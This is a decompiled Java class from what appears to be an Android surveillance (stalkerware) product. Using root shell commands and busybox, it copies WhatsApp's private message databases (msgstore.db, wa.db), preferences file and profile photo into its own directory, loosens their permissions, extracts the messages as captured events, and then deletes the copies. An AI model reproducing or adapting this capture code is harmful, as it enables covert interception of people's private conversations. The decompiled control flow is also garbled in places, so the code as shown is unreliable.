package com.vvt.capture.wa.limited;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class LimitedWhatsAppQuery
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private boolean d = false;
  private LimitedWhatsAppQuery.DatabaseStructure e;
  private com.vvt.base.b f;
  
  public LimitedWhatsAppQuery(String paramString, com.vvt.base.b paramb)
  {
    LimitedWhatsAppQuery.DatabaseStructure localDatabaseStructure = LimitedWhatsAppQuery.DatabaseStructure.UNKNOWN;
    this.e = localDatabaseStructure;
    this.c = paramString;
    this.f = paramb;
  }
  
  private String a(String paramString)
  {
    Object localObject1 = null;
    String str1 = "/data/data/com.whatsapp/files/me.jpg";
    boolean bool1 = ShellUtil.b(str1);
    if (bool1) {
      str1 = "/data/data/com.whatsapp/files/me.jpg";
    }
    for (;;)
    {
      boolean bool3 = com.vvt.ag.b.a(str1);
      String str2;
      if (!bool3)
      {
        str2 = p.a(c(), "me.jpg");
        String str3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int j = 7;
        Object[] arrayOfObject = new Object[j];
        String str4 = b();
        arrayOfObject[0] = str4;
        int k = 1;
        arrayOfObject[k] = str1;
        arrayOfObject[2] = str2;
        arrayOfObject[3] = str2;
        arrayOfObject[4] = paramString;
        arrayOfObject[5] = paramString;
        int i = 6;
        arrayOfObject[i] = str2;
        str1 = String.format(str3, arrayOfObject);
      }
      try
      {
        KMShell.a(str1);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k(str2);
        }
        localObject1 = str2;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          bool2 = b;
          if (!bool2) {}
        }
        boolean bool2 = false;
        Object localObject2 = null;
      }
      return (String)localObject1;
      str1 = "/dbdata/databases/com.whatsapp/files/me.jpg";
      bool2 = ShellUtil.b(str1);
      if (bool2) {
        str1 = "/dbdata/databases/com.whatsapp/files/me.jpg";
      }
    }
  }
  
  private String a(String paramString1, String paramString2)
  {
    String str1 = p.a(paramString1, "msgstore.db");
    boolean bool1 = ShellUtil.b(str1);
    Object localObject = c();
    String str2 = p.a((String)localObject, "msgstore.db");
    String str3;
    int i;
    if (bool1)
    {
      str3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    for (;;)
    {
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str4 = null;
        arrayOfObject[0] = localObject;
        j = 1;
        arrayOfObject[j] = localObject;
        j = 2;
        arrayOfObject[j] = paramString2;
        j = 3;
        arrayOfObject[j] = paramString2;
        j = 4;
        arrayOfObject[j] = localObject;
        str3 = String.format(str3, arrayOfObject);
        KMShell.a(str3);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k((String)localObject);
        }
        str3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject = new Object[k];
        i = 0;
        arrayOfObject = null;
        str4 = b();
        localObject[0] = str4;
        i = 1;
        localObject[i] = str1;
        int m = 2;
        localObject[m] = str2;
        m = 3;
        localObject[m] = str2;
        m = 4;
        localObject[m] = paramString2;
        m = 5;
        localObject[m] = paramString2;
        m = 6;
        localObject[m] = str2;
        str1 = String.format(str3, (Object[])localObject);
        KMShell.a(str1);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k(str2);
        }
        bool2 = a;
        if (!bool2) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      return str2;
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    Object localObject1 = null;
    String str1 = "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
    boolean bool1 = ShellUtil.b(str1);
    if (bool1) {
      str1 = "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
    }
    for (;;)
    {
      boolean bool3 = com.vvt.ag.b.a(str1);
      String str2;
      if (!bool3)
      {
        str2 = p.a(paramString2, "com.whatsapp_preferences.xml");
        String str3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int j = 7;
        Object[] arrayOfObject = new Object[j];
        arrayOfObject[0] = paramString3;
        int k = 1;
        arrayOfObject[k] = str1;
        arrayOfObject[2] = str2;
        arrayOfObject[3] = str2;
        arrayOfObject[4] = paramString1;
        arrayOfObject[5] = paramString1;
        int i = 6;
        arrayOfObject[i] = str2;
        str1 = String.format(str3, arrayOfObject);
      }
      try
      {
        KMShell.a(str1);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k(str2);
        }
        localObject1 = str2;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          bool2 = b;
          if (!bool2) {}
        }
        boolean bool2 = false;
        Object localObject2 = null;
      }
      return (String)localObject1;
      str1 = "/dbdata/databases/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
      bool2 = ShellUtil.b(str1);
      if (bool2) {
        str1 = "/dbdata/databases/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
      }
    }
  }
  
  private String b()
  {
    return p.a(this.c, "busybox");
  }
  
  private String b(String paramString1, String paramString2)
  {
    String str1 = p.a(paramString1, "wa.db");
    boolean bool1 = ShellUtil.b(str1);
    Object localObject = c();
    String str2 = p.a((String)localObject, "wa.db");
    String str3;
    int i;
    if (bool1)
    {
      str3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    for (;;)
    {
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str4 = null;
        arrayOfObject[0] = localObject;
        j = 1;
        arrayOfObject[j] = localObject;
        j = 2;
        arrayOfObject[j] = paramString2;
        j = 3;
        arrayOfObject[j] = paramString2;
        j = 4;
        arrayOfObject[j] = localObject;
        str3 = String.format(str3, arrayOfObject);
        KMShell.a(str3);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k((String)localObject);
        }
        str3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject = new Object[k];
        i = 0;
        arrayOfObject = null;
        str4 = b();
        localObject[0] = str4;
        i = 1;
        localObject[i] = str1;
        int m = 2;
        localObject[m] = str2;
        m = 3;
        localObject[m] = str2;
        m = 4;
        localObject[m] = paramString2;
        m = 5;
        localObject[m] = paramString2;
        m = 6;
        localObject[m] = str2;
        str1 = String.format(str3, (Object[])localObject);
        KMShell.a(str1);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k(str2);
        }
        bool2 = a;
        if (!bool2) {}
      }
      catch (Exception localException)
      {
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      return str2;
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  private String c()
  {
    return p.a(this.c, "whatsapp");
  }
  
  private void d()
  {
    String str1 = c();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject1 = a.a();
      if (localObject1 != null)
      {
        Object localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        localObject1 = a((String)localObject1, (String)localObject2);
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2) {
          l = com.vvt.capture.wa.full.a.a((String)localObject1);
        }
        d();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Long localLong;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    localObject1 = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject1).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject1).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject1 = a.a();
        if (localObject1 != null)
        {
          int i = ((String)localObject1).length();
          if (i > 0)
          {
            Object localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str1 = a((String)localObject1, (String)localObject2);
            boolean bool2 = a;
            if (bool2) {}
            localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str2 = b((String)localObject1, (String)localObject2);
            bool1 = a;
            if (bool1) {}
            localObject1 = c();
            localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str3 = b();
            String str4 = a((String)localObject2, (String)localObject1, str3);
            localObject1 = this.f;
            localObject1 = ((com.vvt.base.b)localObject1).f();
            String str5 = a((String)localObject1);
            localObject1 = this.e;
            localObject2 = LimitedWhatsAppQuery.DatabaseStructure.UNKNOWN;
            if (localObject1 == localObject2)
            {
              bool1 = com.vvt.capture.wa.full.a.b(str1);
              this.d = bool1;
              bool1 = this.d;
              if (!bool1) {
                continue;
              }
              localObject1 = LimitedWhatsAppQuery.DatabaseStructure.OLD_DESIGN;
              this.e = ((LimitedWhatsAppQuery.DatabaseStructure)localObject1);
            }
            bool1 = a;
            if (bool1) {}
            long l1 = com.vvt.capture.wa.full.a.a(str1);
            long l2 = 0L;
            bool1 = a;
            if (bool1) {}
            localObject1 = this.c;
            String str6 = Integer.toString(paramInt);
            boolean bool3 = this.d;
            com.vvt.base.b localb = this.f;
            localObject1 = com.vvt.capture.wa.full.a.a((String)localObject1, l2, l1, str6, bool3, str1, str2, str4, str5, localb, false);
            localArrayList.addAll((Collection)localObject1);
            bool1 = a;
            if (bool1) {}
            d();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject1 = LimitedWhatsAppQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    for (;;)
    {
      try
      {
        localObject1 = ((g)paramg1).getReference();
        localObject1 = (Long)localObject1;
        long l1 = ((Long)localObject1).longValue();
        localObject1 = ((g)paramg2).getReference();
        localObject1 = (Long)localObject1;
        long l2 = ((Long)localObject1).longValue();
        localObject1 = a.a();
        if (localObject1 != null)
        {
          int i = ((String)localObject1).length();
          if (i > 0)
          {
            Object localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str1 = a((String)localObject1, (String)localObject2);
            boolean bool2 = a;
            if (bool2) {}
            localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str2 = b((String)localObject1, (String)localObject2);
            bool1 = a;
            if (bool1) {}
            localObject1 = c();
            localObject2 = this.f;
            localObject2 = ((com.vvt.base.b)localObject2).f();
            String str3 = b();
            str3 = a((String)localObject2, (String)localObject1, str3);
            localObject1 = this.f;
            localObject1 = ((com.vvt.base.b)localObject1).f();
            String str4 = a((String)localObject1);
            localObject1 = this.e;
            localObject2 = LimitedWhatsAppQuery.DatabaseStructure.UNKNOWN;
            if (localObject1 == localObject2)
            {
              bool1 = com.vvt.capture.wa.full.a.b(str1);
              this.d = bool1;
              bool1 = this.d;
              if (!bool1) {
                continue;
              }
              localObject1 = LimitedWhatsAppQuery.DatabaseStructure.OLD_DESIGN;
              this.e = ((LimitedWhatsAppQuery.DatabaseStructure)localObject1);
            }
            bool1 = a;
            if (bool1) {}
            localObject1 = this.c;
            bool2 = this.d;
            com.vvt.base.b localb = this.f;
            localObject1 = com.vvt.capture.wa.full.a.a((String)localObject1, l1, l2, bool2, str1, str2, str3, str4, localb, false);
            localArrayList.addAll((Collection)localObject1);
            bool1 = a;
            if (bool1) {}
            d();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject1 = LimitedWhatsAppQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/limited/LimitedWhatsAppQuery.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */